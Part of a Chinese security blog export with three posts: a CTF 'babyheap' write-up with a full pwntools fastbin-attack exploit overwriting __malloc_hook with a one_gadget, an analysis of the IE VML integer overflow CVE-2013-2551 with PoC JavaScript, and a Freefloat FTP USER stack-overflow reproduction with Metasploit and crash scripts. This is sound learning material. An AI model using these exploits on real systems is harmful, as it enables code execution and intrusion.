<p>在3C4AF0到3C4B10直接寻找size字段：</p>
<p>因为在64位系统中，地址8字节只使用了低6字节，而且hook函数和_IO_wfile_jumps的偏移地址最高位0x7F，align 20h为0，可以错位构造size：0x3C4AF0为 ? ? ? ? ? 7F 00 00  而 0x3C4AF8 00 00 00 00 00，选择0x3C4AF5~0x3C4AFC：7F 00 00 00 00 00 00 00，对应需要分配的chunk大小位0x60</p>
<img src="https://i.loli.net/2021/04/02/ZmeLt8C79yWsK65.png" style="zoom:80%;" />

<p>之前已经将index4_chunk 释放进unsorted_bin，再次分配0x60可以切割index4_chunk，由0x90成0x60，在free进unsorted_bin，构造0x60的unsorted_bin的链</p>
<p>index2也指向index4_chunk，通过修改index2内容将index4_chunk的 fd 指向__malloc_hook的伪造chunk地址（计算偏移），再次分配两次，一次获得index4_chunk，另一次指向 malloc_hook</p>
<img src="https://i.loli.net/2021/04/02/JM321x6KsGZNSY8.png" style="zoom:80%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook_addr))</span><br><span class="line"><span class="comment">#构造0x60 unsorted_bin链</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造chunk，指向hook</span></span><br><span class="line">fake_chunk = flat(hook_addr - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(fake_chunk), fake_chunk)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#获取index6指向hook地址</span></span><br></pre></td></tr></table></figure>

<h4 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h4><p>将malloc_hook篡改为onegadget，之后调用calloc即可</p>
<p>获取onegadget，依次尝试</p>
<img src="https://i.loli.net/2021/04/02/l79YXkywmgFhbIH.png" style="zoom:80%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line"><span class="comment">#篡改__malloc_hook</span></span><br><span class="line">payload = flat(cyclic(<span class="number">0x13</span>), one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment">#触发calloc</span></span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="完整exploit"><a href="#完整exploit" class="headerlink" title="完整exploit"></a>完整exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 0 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 1 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 2 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 3 to fastbin &lt;-------新增加的chunk</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index 4 to unsorted_bin</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">extend_0 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>, <span class="string">b&#x27;\x80&#x27;</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(extend_0), extend_0)</span><br><span class="line"><span class="comment">#修改为fastbins大小，用于分配</span></span><br><span class="line">extend_3 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(extend_3), extend_3)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改回fastbins大小，用于释放到unsorted_bin</span></span><br><span class="line">extend_3 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(extend_3), extend_3)</span><br><span class="line"><span class="comment">#分配一个chunk防止unsorted_chunk与top_chunk合并</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">unsorted_main_arena = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;unsorted_main_arena_addr: &quot;</span> + <span class="built_in">hex</span>(unsorted_main_arena))</span><br><span class="line"></span><br><span class="line">main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = unsorted_main_arena - (main_arena + <span class="number">88</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc base addr: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook_addr))</span><br><span class="line"><span class="comment">#构造0x60 unsorted_bin链</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造chunk，指向hook</span></span><br><span class="line">fake_chunk = flat(hook_addr - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(fake_chunk), fake_chunk)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#获取index6指向hook地址</span></span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line"><span class="comment">#篡改__malloc_hook</span></span><br><span class="line">payload = flat(cyclic(<span class="number">0x13</span>), one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment">#触发calloc</span></span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="三、解法二"><a href="#三、解法二" class="headerlink" title="三、解法二"></a>三、解法二</h3><p>按照本文的思路一：分配两个chunk，index1和index2，扩展index1到index2的fd和bk指针，释放index2，index2的fd和bk指针会指向main_arena，读取index1获取index2的内容</p>
<p>如果直接读取index1，由于读取的index1大小在分配时已经固定在索引表中，与实际的chunk size字段不匹配，需要free掉index1，然后重新分配chunk size大小，可更新索引表中的size，这个时候读取index1内容</p>
<img src="https://i.loli.net/2021/04/02/U8LHXI5bpcwAg3O.png" style="zoom:80%;" />

<h4 id="比较解法一和解法二"><a href="#比较解法一和解法二" class="headerlink" title="比较解法一和解法二"></a>比较解法一和解法二</h4><ul>
<li><p>解法一在释放分配目标unsorted chunk的时候为了绕过fastbin和unsorted_bin需要两次更改size字段以绕过安全检查，可以将大小为fastbin更改为unsorted_bin，应该可以减少安全绕过次数</p>
</li>
<li><p>解法一一直有个问题困扰我，为什么只需要更改最低位一个字节就可以将指针指向目标地址，原来：在libc2.23中，用户分配的第一个堆块就位于堆区起始地址，也就是说用户分配的第一个堆块的地址最低字节一定是00（在目前的libc版本中，堆区的起始地址最低字节都是00），这样可以计算偏移，但在libc2.26的系统中，用户分配的第一个堆块并不位于堆区的起始处！而是从堆区起始地址往后偏移了很大一段距离（可能要根据glibc版本计算偏移） 。解法一容易出现glibc版本不兼容</p>
</li>
</ul>
<p><a href="https://www.anquanke.com/post/id/168009">详细内容</a></p>
<h3 id="四、总结："><a href="#四、总结：" class="headerlink" title="四、总结："></a>四、总结：</h3><p>通过此题get到的新知识</p>
<ul>
<li>fastbin_attack</li>
<li>libc基地址泄露</li>
<li>__malloc_hook</li>
<li>size错位构造</li>
</ul>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul>
<li><a href="https://www.anquanke.com/post/id/168009">https://www.anquanke.com/post/id/168009</a></li>
<li><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack</a></li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>堆</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2013-2551漏洞分析</title>
    <url>/2021/08/18/CVE-2013-2551%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
<li>漏洞编号：CVE-2013-2551</li>
<li>漏洞类型：整数溢出<span id="more"></span>
<h3 id="2-概述"><a href="#2-概述" class="headerlink" title="2. 概述"></a>2. 概述</h3></li>
</ul>
<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="1-分析环境"><a href="#1-分析环境" class="headerlink" title="1. 分析环境"></a>1. 分析环境</h3><ul>
<li>win7 x86 sp1</li>
<li>windbg</li>
<li>IDA PRO</li>
<li>IExplore 8</li>
</ul>
<h3 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h3><p>Vector Markup Language (VML)是基于xml文件格式用于显示二维矢量图像的。</p>
<p>标记使用的是XML扩展，需要一个namespace(命名空间)，可以使用惯用的“v”作为命名空间，而在这里，它的用处是把命名空间“v”和系统预定义的行为VML连接。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:v</span>=<span class="string">&quot;urn:schemas-microsoft-com:vml&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="css">v\:* &#123; Behavior: <span class="built_in">url</span>(<span class="string">#default#VML</span>) &#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>VML标记，shape可以为Oval(圆)，Line(线)等图形。 <a href="https://docs.microsoft.com/zh-cn/windows/win32/vml/shape-element--vml">Shape</a> 元素内可以定义 <a href="https://docs.microsoft.com/zh-cn/windows/win32/vml/msdn-online-vml-stroke-element">Stroke</a>元素：用来定义shape的笔划，stroke的属性 DashStyle 用于指定描边的点线和虚线图案，正是存在漏洞的属性</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">v:shape</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">v:stroke</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">v:shape</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h3><p>获取POC，触发漏洞</p>
<p>开启页堆，重新调试，进程出现地址访问错误</p>
<img src="https://i.loli.net/2021/08/18/qTjRadhk8KJUEec.png" style="zoom:80%;" />

<p>栈回溯</p>
<img src="https://i.loli.net/2021/08/18/vhBTKMA8rZRkfE1.png" style="zoom:80%;" />

<p>在vgx!ORG::GET 函数下断点，重新调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sxe ld vgx.dll   #使程序加载vgx.dll的时候断下</span><br><span class="line">bp vgx!ORG::Get</span><br></pre></td></tr></table></figure>

<p>IDA加载VGX.dll，查看ORG::Get函数</p>
<img src="https://i.loli.net/2021/08/18/nM51GtFeWimofEB.png" style="zoom:80%;" />

<p>结合windbg调试，a1是一个this指针指向vftable，程序将a1的内容进行计算得到源地址，并赋值给a2，由于经a1得到的地址访问错误导致崩溃。因此需要找到改变vftable内容的函数</p>
<img src="https://i.loli.net/2021/08/18/cURBtPO4MegWaId.png" style="zoom:80%;" />

<p>这里无法找到漏洞成因，那么需要继续栈回溯到vgx!COALineDashStyleArray::get_item，由于函数的第一个参数是this指针，上一个调用函数不在vgx.dll中，回溯意义不大。</p>
<img src="https://i.loli.net/2021/08/18/qSnUJC9e7vcwAbg.png" style="zoom:80%;" />

<p>可以推断两个ORG::Get和get_item函数都是用于触发异常，简单的回溯无法判断漏洞位置，应该从poc入手</p>
<h4 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h4><p>在创建好vml元素的命名空间后，调用函数createRects()，创建vml元素数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建vml元素数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createRects</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">		rect_array[i] = <span class="built_in">document</span>.createElement(<span class="string">&quot;v:shape&quot;</span>)</span><br><span class="line">		rect_array[i].id = <span class="string">&quot;rect&quot;</span> + i.toString()</span><br><span class="line">		<span class="built_in">document</span>.body.appendChild(rect_array[i])</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并定义两个vml元素vml1和shape，按钮button绑定点击事件crashme()，触发漏洞</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;v:oval&gt;</span><br><span class="line">	&lt;v:stroke id=<span class="string">&quot;vml1&quot;</span> /&gt;</span><br><span class="line">&lt;/v:oval&gt;</span><br><span class="line">&lt;v:oval&gt;</span><br><span class="line">	&lt;v:stroke dashstyle=<span class="string">&quot;2 2 2 0 2 2 2 0&quot;</span> id=<span class="string">&quot;shape&quot;</span> /&gt;</span><br><span class="line">&lt;/v:oval&gt;</span><br><span class="line">&lt;input value=<span class="string">&quot;crash!!!&quot;</span> type=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;crashme();&quot;</span>&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>

<p>crashme()将a数组元素设置为之前创建的v:shape数组的RuntimeStyle，最后设置vml1的dashstyle长度为44即0x2C</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">	a[i] = <span class="built_in">document</span>.getElementById(<span class="string">&quot;rect&quot;</span> + i.toString())._vgRuntimeStyle;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">	a[i].rotation;                                                   <span class="comment">//create a COARuntimeStyle</span></span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;                                                <span class="comment">//allocate an ORG array of size 0x2c</span></span><br><span class="line">		vml1.dashstyle = <span class="string">&quot;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后 dashstyle 数组长度被置为-1，显然造成了整数溢出漏洞，导致调用get_item()引发数组越界访问，触发漏洞。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span></span><br><span class="line">shape.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>存在整数溢出的函数一定与dashstyle有关，在Functions window搜索dashstyle，找到最可疑的函数，windbg下断点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bp vgx!COALineDashStyleArray::put_length</span><br></pre></td></tr></table></figure>



<img src="https://i.loli.net/2021/08/18/z86itLpGTKeECno.png" style="zoom:80%;" />

<p>命中断点后单步运行，程序调用CElements获取DashStyleArray对象的长度，返回值eax=2c，正是poc中vml1.dashstyle数组长度，保存在this指针里</p>
<img src="https://i.loli.net/2021/08/18/sfKSp6F2qJMRvXL.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/O9ufwMzdBmeog3b.png" style="zoom:80%;" />

<p>接着获取第二个参数FFFF即-1，计划将数组长度设置为目标长度-1。如果当前长度0x2c大于目标长度-1，则调用DeleteRange将多余的元素删除，使得数组长度等于目标长度</p>
<img src="https://i.loli.net/2021/08/18/Rp38OqA7L5XzHca.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/sgnJj1QSV5N6T4z.png" style="zoom:80%;" />

<p>对应的 IDA 反编译代码位于COALineDashStyleArray::put_length()</p>
<img src="https://i.loli.net/2021/08/18/1xori9kKzbgduwF.png" style="zoom:80%;" />

<p>依次跟进DeleteRange()、MsoDeletePx()、MsoFRemovePx()，这三个函数的参数都相同，第一个this指针，第二个目标长度，第三个是需要删除的范围，即当前长度减目标长度</p>
<img src="https://i.loli.net/2021/08/18/AGvIckwuhyn35WJ.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/oI2EzTcYyOtfZWD.png" style="zoom:80%;" />

<p>导致漏洞的位置在MsoFRemovePx()。进行调试，程序首先获取this指针</p>
<img src="https://i.loli.net/2021/08/18/oulzL2SWmvbAkhR.png" style="zoom:80%;" />

<p>获取数组每个单位的长度，这里是int，4个字节</p>
<img src="https://i.loli.net/2021/08/18/8ewyScdYNt1JPzW.png" style="zoom:80%;" />

<p>[esi+0Ch]为数组首地址，数组首地址+目标长度*每个单位长度 = 数组需要删除的部分首地址</p>
<img src="https://i.loli.net/2021/08/18/yuJFL7afo8gqBlm.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/WMvbp76e8NSyYwF.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/08/18/le7OFNoAxISd6hU.png" style="zoom:80%;" />

<p>对应c语言代码，v5 = 数组需要删除的部分首地址，主要执行了第10行和第11行两条语句，接下来跳过if语句</p>
<img src="https://i.loli.net/2021/08/18/cQgIFMVzEYk2O6p.png" style="zoom:80%;" />

<p>然后动态调试的部分c语言代码：</p>
<img src="https://i.loli.net/2021/08/18/dHbiUOwqhLlk3EA.png" style="zoom:80%;" />

<p>这个if语句也不满足，跳转指向更新数组长度的语句，更新前vftable中保存的长度为2c，更新后长度为ffff，易造成数组访问越界</p>
<img src="https://i.loli.net/2021/08/18/4Po6SZKxdQjkqyH.png" style="zoom:80%;" />



<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h3><h3 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h3><h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
<li>《漏洞战争》</li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>整数溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>Freefloat FTP Server1.0栈溢出漏洞分析</title>
    <url>/2021/03/31/freefloatftpserver1.0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
<li>漏洞名称：Freefloat FTP server – ‘USER’ Remote Buffer Overflow</li>
<li>漏洞编号：EDB-ID 23243</li>
<li>漏洞类型：栈溢出</li>
<li>漏洞影响：远程代码执行</li>
<li>利用难度：Esay</li>
</ul>
<span id="more"></span>
<h3 id="2-组件概述"><a href="#2-组件概述" class="headerlink" title="2. 组件概述"></a>2. 组件概述</h3><p>freefloatftpserver1.0 用于打开ftp服务，用于上传文件和管理有线及无线设备的软件</p>
<h3 id="3-漏洞影响"><a href="#3-漏洞影响" class="headerlink" title="3. 漏洞影响"></a>3. 漏洞影响</h3><p>freefloatftpserver1.0</p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
<li>靶机环境：Windows xp sp3</li>
<li>靶机配置：<ul>
<li> freefloatftpserver1.0</li>
<li> Immunity Debugger</li>
<li> Mona</li>
</ul>
</li>
<li>攻击机：kali 2.0</li>
<li>攻击机配置<ul>
<li>­    Pwntools</li>
<li>­    Metasploit</li>
</ul>
</li>
</ul>
<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2. 复现过程"></a>2. 复现过程</h3><p>使用两种工具Infigo FTPStress Fuzzer和Metasploit都能测试出溢出漏洞存在</p>
<h4 id="2-1-使用Infigo-FTPStress-Fuzzer触发漏洞"><a href="#2-1-使用Infigo-FTPStress-Fuzzer触发漏洞" class="headerlink" title="2.1 使用Infigo FTPStress Fuzzer触发漏洞"></a>2.1 使用Infigo FTPStress Fuzzer触发漏洞</h4><h5 id="2-1-1-在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口"><a href="#2-1-1-在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口" class="headerlink" title="2.1.1 在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口"></a>2.1.1 在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口</h5><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/1.png?raw=true" style="zoom:80%">

<h5 id="2-1-2-ftpfuzz触发漏洞"><a href="#2-1-2-ftpfuzz触发漏洞" class="headerlink" title="2.1.2 ftpfuzz触发漏洞"></a>2.1.2 ftpfuzz触发漏洞</h5><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/2.png?raw=true" style="zoom:80%">

<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/3.png?raw=true" style="zoom:60%">

<p>eip指向fuzz发送的测试数组‘AAAA‘，程序执行流已被更改，存在溢出漏洞</p>
<h4 id="2-2-使用metasploit的ftp-fuzz进行测试"><a href="#2-2-使用metasploit的ftp-fuzz进行测试" class="headerlink" title="2.2 使用metasploit的ftp fuzz进行测试"></a>2.2 使用metasploit的ftp fuzz进行测试</h4><p>攻击机kali运行metasploit，运行如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打开metasploit</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta">#</span><span class="bash">查询可用的fuzz</span></span><br><span class="line">search fuzzing</span><br><span class="line"><span class="meta">#</span><span class="bash">使用ftp fuzz模块</span></span><br><span class="line">use auxiliary/fuzzers/ftp/ftp_pre_post</span><br><span class="line"><span class="meta">#</span><span class="bash">设置靶机</span></span><br><span class="line">set RHOST 192.168.112.146</span><br><span class="line"><span class="meta">#</span><span class="bash">漏洞利用</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/4.png?raw=true" style="zoom:70%">
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/5.png?raw=true" style="zoom:60%">

<p>靶机崩溃，eip指向未知内存地址，可以溢出</p>
<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1. 背景知识"></a>1. 背景知识</h3><p>最简单的栈溢出，jmp esp作为跳板跳转到栈中执行</p>
<h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h3><h4 id="2-1-Immunity-Debugger调试"><a href="#2-1-Immunity-Debugger调试" class="headerlink" title="2.1 Immunity Debugger调试"></a>2.1 Immunity Debugger调试</h4><p>在靶机用Immunity Debugger打开freefloatftpserver1.0运行调试</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/6.png?raw=true" style="zoom:80%">

<h4 id="2-2-python发包测试"><a href="#2-2-python发包测试" class="headerlink" title="2.2 python发包测试"></a>2.2 python发包测试</h4><p>在kali攻击机用pwntools编写脚本，向ftp服务器的USER输入点发送数据包测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line">paylad = <span class="string">&#x27;A&#x27;</span>*<span class="number">500</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>程序崩溃，eip指向0x41414141，由发送的数据A的ascii码为0x41可知，USER输入点存在溢出漏洞</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/7.png?raw=true" style="zoom:80%">

<h4 id="2-3-定位溢出点"><a href="#2-3-定位溢出点" class="headerlink" title="2.3 定位溢出点"></a>2.3 定位溢出点</h4><p>输入用户名之前，程序会输出一条ftp服务器版本的语句，在immunity debugger中定位输出这句话的函数，从而缩小定位漏洞函数的范围</p>
<p><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/8.png?raw=true" alt="my-logo.png"></p>
<p>查询字符串</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/9.png?raw=true" style="zoom:80%">

<p>在wsprintw函数设置断点</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/10.png?raw=true" style="zoom:80%">

<p>重新发送payload，单步调试，直到运行到出现异常的函数freefloa.004020E0</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/11.png?raw=true" style="zoom:80%">

<p>在freefloa.004020E0函数设置断点，重新发送payload，f7单步步入此函数</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/12.png?raw=true" style="zoom:80%">

<p>重复上述操作，接着在freefloa.00402190函数设置断点，单步步入，程序会在运行到00402881处跳转到004028EB处执行，之后调用freefloa.00402DE0函数，程序崩溃</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/13.png?raw=true" style="zoom:80%">

<p>在freefloa.00402DE0函数设置断点，步入之后未发现存在子函数，并且在返回的时候执行retn 8指令</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/14.png?raw=true" style="zoom:80%">

<p>观察此时esp指向的返回地址为0x41414141，执行retn命令之后eip指向0x41414141，使得程序崩溃</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/15.png?raw=true" style="zoom:80%">

<p>得出结论：freefloa.00402DE0函数可能出现栈溢出</p>
